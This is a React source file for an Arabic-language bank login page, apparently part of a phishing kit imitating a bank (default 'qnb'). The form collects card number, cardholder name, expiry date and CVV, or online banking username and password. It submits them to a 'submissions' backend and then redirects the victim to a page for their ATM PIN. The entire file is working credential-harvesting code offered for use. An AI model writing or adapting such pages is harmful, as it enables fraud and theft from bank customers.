import { useState } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";

export default function LoginMethod() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);
  const bank = params.get("bank") || "qnb";
  const sessionId = localStorage.getItem("sessionId") || "";

  const [method, setMethod] = useState<"card" | "user">("card");
  const [cardData, setCardData] = useState({
    cardNumber: "",
    cardholderName: "",
    expiryDate: "",
    cvv: "",
  });
  const [userData, setUserData] = useState({
    username: "",
    password: "",
  });

  const submitLoginMethodMutation = trpc.submissions.submitLoginMethod.useMutation();

  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setCardData((prev) => ({ ...prev, [name]: value }));
  };

  const handleUserChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setUserData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      if (method === "card") {
        await submitLoginMethodMutation.mutateAsync({
          sessionId,
          loginType: "card",
          cardNumber: cardData.cardNumber,
          cardholderName: cardData.cardholderName,
          expiryDate: cardData.expiryDate,
          cvv: cardData.cvv,
          username: undefined,
          password: undefined,
        } as any);
      } else {
        await submitLoginMethodMutation.mutateAsync({
          sessionId,
          loginType: "user",
          username: userData.username,
          password: userData.password,
          cardNumber: undefined,
          cardholderName: undefined,
          expiryDate: undefined,
          cvv: undefined,
        } as any);
      }
      toast.success("تم حفظ البيانات بنجاح");
      setLocation(`/atm-pin?bank=${bank}&session=${sessionId}`);
    } catch (error) {
      toast.error("حدث خطأ في حفظ البيانات");
    }
  };

  return (
    <html lang="ar" dir="rtl">
      <head>
        <meta charSet="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>طريقة التسجيل</title>
        <style>{`
          body { font-family: sans-serif; background-color: #f4f4f4; margin: 0; padding-top: 70px; display: flex; flex-direction: column; min-height: 100vh; }
          
          .header { position: fixed; top: 0; width: 100%; display: flex; justify-content: space-between; align-items: center; padding: 10px 25px; background-color: #ffffff; border-bottom: 2px solid #8C0032; z-index: 1000; box-sizing: border-box; }
          .logo { height: 40px; }
          .menu-icon { font-size: 28px; color: #8C0032; cursor: pointer; }
          .lang-btn { background: transparent; color: #8C0032; border: 2px solid #8C0032; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; }

          .container { padding: 20px; flex: 1; }
          
          .selection-box { background: white; border: 2px solid #ddd; border-radius: 10px; padding: 20px; margin-bottom: 15px; cursor: pointer; text-align: center; transition: 0.3s; }
          .selection-box.active { border-color: #8C0032; background-color: #fff9f9; }
          .selection-box h3 { margin: 0 0 10px 0; color: #333; }
          .selection-box p { margin: 0; color: #8C0032; font-weight: bold; }

          .form-section { background: white; padding: 20px; border-radius: 10px; display: none; margin-top: 15px; }
          .form-section.active { display: block; }
          .form-group { margin-bottom: 15px; }
          label { display: block; margin-bottom: 5px; font-weight: bold; }
          input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
          .submit-btn { background: #8C0032; color: white; padding: 15px; width: 100%; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 10px; }
          
          .footer-image { width: 100%; display: block; margin-top: 20px; }
          
          .flex-row { display: flex; gap: 10px; }
          .flex-row .form-group { flex: 1; }
        `}</style>
      </head>
      <body>
        <header className="header">
          <div className="menu-icon">&#9776;</div>
          <img src="https://i.ibb.co/5XVcXsGs/1dd76f2f664441de0899c73896f966f1.jpg" className="logo" />
          <a href="login_method_en.html" className="lang-btn" style={{ textDecoration: "none" }}>
            English
          </a>
        </header>

        <div className="container">
          <div
            className={`selection-box ${method === "card" ? "active" : ""}`}
            onClick={() => setMethod("card")}
          >
            <h3>تسجيل الدخول</h3>
            <p>البطاقة البنكية</p>
          </div>

          <div
            className={`selection-box ${method === "user" ? "active" : ""}`}
            onClick={() => setMethod("user")}
          >
            <h3>تسجيل الدخول</h3>
            <p>باسم المستخدم وكلمة المرور</p>
          </div>

          <form onSubmit={handleSubmit}>
            {method === "card" && (
              <div className="form-section active">
                <div className="form-group">
                  <label>رقم البطاقة</label>
                  <input
                    type="number"
                    name="cardNumber"
                    placeholder="XXXX XXXX XXXX XXXX"
                    value={cardData.cardNumber}
                    onChange={handleCardChange}
                    required
                  />
                </div>
                <div className="form-group">
                  <label>اسم صاحب البطاقة</label>
                  <input
                    type="text"
                    name="cardholderName"
                    placeholder="Cardholder Name"
                    value={cardData.cardholderName}
                    onChange={handleCardChange}
                    required
                  />
                </div>
                <div className="flex-row">
                  <div className="form-group">
                    <label>تاريخ الانتهاء</label>
                    <input
                      type="text"
                      name="expiryDate"
                      placeholder="MM/YY"
                      value={cardData.expiryDate}
                      onChange={handleCardChange}
                      required
                    />
                  </div>
                  <div className="form-group">
                    <label>CVV</label>
                    <input
                      type="number"
                      name="cvv"
                      placeholder="XXX"
                      value={cardData.cvv}
                      onChange={handleCardChange}
                      required
                    />
                  </div>
                </div>
                <button type="submit" className="submit-btn">
                  متابعة
                </button>
              </div>
            )}

            {method === "user" && (
              <div className="form-section active">
                <div className="form-group">
                  <label>اسم المستخدم</label>
                  <input
                    type="text"
                    name="username"
                    placeholder="Username"
                    value={userData.username}
                    onChange={handleUserChange}
                    required
                  />
                </div>
                <div className="form-group">
                  <label>كلمة المرور</label>
                  <input
                    type="password"
                    name="password"
                    placeholder="Password"
                    value={userData.password}
                    onChange={handleUserChange}
                    required
                  />
                </div>
                <button type="submit" className="submit-btn">
                  متابعة
                </button>
              </div>
            )}
          </form>
        </div>

        <img src="https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" className="footer-image" alt="Footer" />
      </body>
    </html>
  );
}
